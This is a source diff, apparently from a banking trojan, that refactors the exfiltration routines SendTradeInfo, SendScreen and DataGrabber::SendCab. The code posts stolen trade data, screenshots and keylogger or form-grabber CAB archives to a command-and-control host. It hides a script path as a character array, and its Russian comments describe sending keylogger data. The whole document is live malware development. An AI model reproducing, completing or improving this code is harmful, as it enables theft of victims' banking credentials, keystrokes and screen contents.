@@ -960,17 +960,16 @@ bool SendFirstInfo()
 
 bool SendTradeInfo( char *Buffer )
 {
-	PCHAR Serv = GetActiveHost();
+	string Serv = GetActiveHost();
 	
-	if ( Serv == NULL )
-	{
+	if ( Serv.IsEmpty())
 		return 0;
-	}
+
+
 
 	char Host[30];
-	m_lstrcpy( Host, Serv );
+	m_lstrcpy( Host, Serv.t_str());
 
-	STR::Free(Serv);
 
 	char Script[]  = {'/','g','e','t','/','t','r','a','.','h','t','m','l',0};
 	char Args[]	   = "id=%s&data=%s";
@@ -1044,6 +1043,7 @@ bool SendTradeInfo( char *Buffer )
 
 	return  Ret;
 }
+
 
 
 
@@ -1124,17 +1124,17 @@ bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
 		return false;
 	}
 
-	PCHAR CheckHost = GetActiveHost();
+	string CheckHost = GetActiveHost();
 
-	if ( !CheckHost )
+	if (CheckHost.IsEmpty() )
 	{
 		return false;
 	}
 
-	char Host[30];
-	m_lstrcpy( Host, CheckHost );
 
-	STR::Free(CheckHost);
+//	char Host[30];
+//	m_lstrcpy( Host, CheckHost );
+
 
 	char HeaderTemplate[] = "POST /get/scr.html HTTP/1.0\r\n"
 							"Host: %s\r\n"
@@ -1183,11 +1183,11 @@ bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
 	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len + dwFileSize + m_lstrlen( Boundary_1 ) + 2;
 
 	char *Header = (char*)MemAlloc( 1024 );
-	_pwsprintfA( Header, HeaderTemplate, Host, UserAgent, dwContentLen, dwBoundary );
+	_pwsprintfA( Header, HeaderTemplate, CheckHost.t_str(), UserAgent, dwContentLen, dwBoundary );
 
 	bool ret = false;
 
-	SOCKET Socket = MyConnect( Host, 80 );	
+	SOCKET Socket = MyConnect(CheckHost.t_str(), 80 );
 
 	if( Socket != -1 )
 	{
@@ -1929,7 +1929,8 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 	return R;
 }
 
-bool DataGrabber::SendCab(PCHAR aURL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
+
+bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 {
 	// Отправляем пост запрос на скрипт хранения данных кейлогера
 	if (InvalidFile != NULL)
@@ -1950,7 +1951,11 @@ bool DataGrabber::SendCab(PCHAR aURL, PCHAR CabFileName, PCHAR AppName, bool* In
 	MONITOR_DELIMETED_MSG(BMCONST(MessageSendCab), AppName, ":", CabFileName);
 
 	// Инициализируем адрес
-	string URL = (STRA::IsEmpty(aURL)) ? string(aURL) : GetBankingScriptURL(SCRIPT_CAB, IsBanking);
+	bool GenerateURL = STRA::IsEmpty(URL);
+	if (GenerateURL)
+		URL = GetBotScriptURL(SCRIPT_CAB, NULL, IsBanking);
+
+	if (STRA::IsEmpty(URL)) return false;
 
     LDBG("Loader", "Отправляем CAB архив с именем [%s]", AppName);
 
@@ -1977,7 +1982,7 @@ bool DataGrabber::SendCab(PCHAR aURL, PCHAR CabFileName, PCHAR AppName, bool* In
 	THTTPResponse Response;
 	ClearStruct(Response);
 
-    bool Result = HTTP::Post(URL.t_str(), Data, NULL, &Response);
+    bool Result = HTTP::Post(URL, Data, NULL, &Response);
  
 	if (Result)
 		Result = CheckValidPostResult(&Response, NULL);
@@ -2006,6 +2011,9 @@ bool DataGrabber::SendCab(PCHAR aURL, PCHAR CabFileName, PCHAR AppName, bool* In
 	if (Result)
 		LDBG("Loader", "CAB [%s] успешно отправлен", AppName);
 
+
+	if (GenerateURL)
+		STR::Free(URL);
 
 	return Result;
 }
